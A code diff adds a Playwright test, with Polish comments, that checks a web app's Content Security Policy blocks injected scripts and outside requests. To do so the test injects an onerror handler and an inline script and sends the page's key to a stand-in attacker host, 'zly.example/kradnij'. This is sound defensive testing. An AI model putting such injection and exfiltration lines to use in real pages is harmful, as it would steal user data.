@@ -43,6 +43,7 @@ async function page(calls, offline, opt = {}) {
   // opt.intro ją włącza (pokazuje się tylko z opt.motion)
   if (!opt.intro) await ctx.addInitScript(() => { try { localStorage.setItem('intro', '4102444800000'); } catch (e) {} });
   const p = await ctx.newPage(); p.errors = []; p.on('pageerror', e => p.errors.push(e.message));
+  p.on('console', m => { if (/Content Security Policy/i.test(m.text())) p.errors.push(m.text()); });   // blokada obcych skryptów (CSP): każde naruszenie = błąd
   p.external = []; p.on('request', q => { if (!q.url().startsWith(base) && !/\/macros\//.test(q.url())) p.external.push(q.url()); });
   return { ctx, p };
 }
@@ -1542,6 +1543,28 @@ test('offline: czcionki i lib.js z pamięci service workera', async () => {
   const cached = await p.evaluate(async () => { const c = await caches.open((await caches.keys())[0]); return (await c.keys()).map(r => new URL(r.url).pathname); });
   for (const f of ['/lib.js', '/fonts/big-shoulders-display-latin-wght-normal.woff2', '/fonts/instrument-sans-latin-ext-wght-normal.woff2'])
     assert.ok(cached.includes(f), 'w pamięci: ' + f);
+  await ctx.close();
+});
+
+test('blokada obcych skryptów (CSP, punkt 14 przeglądu v80): bez skryptów w HTML, wstrzyknięty kod i obcy adres zablokowane', async () => {
+  const html = fs.readFileSync(path.join(WEB, 'index.html'), 'utf8');
+  assert.deepEqual(html.match(/<script(?![^>]*\ssrc=)[^>]*>/g), null, 'index.html bez skryptów w treści');
+  assert.doesNotMatch(html, /\son[a-z]+=["']/, 'bez onclick= i podobnych w HTML');
+  const csp = html.match(/http-equiv="Content-Security-Policy" content="([^"]+)"/)[1];
+  assert.match(csp, /script-src 'self';/); assert.doesNotMatch(csp, /script-src[^;]*unsafe/);
+  const sw = fs.readFileSync(path.join(WEB, 'sw.js'), 'utf8');
+  ['app.js', 'intro.js'].forEach(f => assert.match(sw, new RegExp("'" + f.replace('.', '\\.') + "'"), 'w pamięci telefonu: ' + f));
+  const { ctx, p } = await page([]);
+  await p.goto(base + '?k=kabc'); await p.waitForSelector('.set[data-o="1"]');
+  const r = await p.evaluate(async () => {
+    document.body.insertAdjacentHTML('beforeend', '<img src="data:," onerror="window.__wstrzykniete = 1" alt="">');
+    const s = document.createElement('script'); s.textContent = 'window.__skrypt = 1'; document.body.appendChild(s);
+    await new Promise(res => setTimeout(res, 300));
+    let obcy = 'wysłane'; try { await fetch('https://zly.example/kradnij?k=kabc', { mode: 'no-cors' }); } catch (e) { obcy = 'zablokowane'; }
+    return [window.__wstrzykniete, window.__skrypt, obcy];
+  });
+  assert.deepEqual(r, [undefined, undefined, 'zablokowane']);
+  assert.ok(p.errors.length >= 2 && p.errors.every(e => /Content Security Policy/.test(e)), JSON.stringify(p.errors));
   await ctx.close();
 });
 
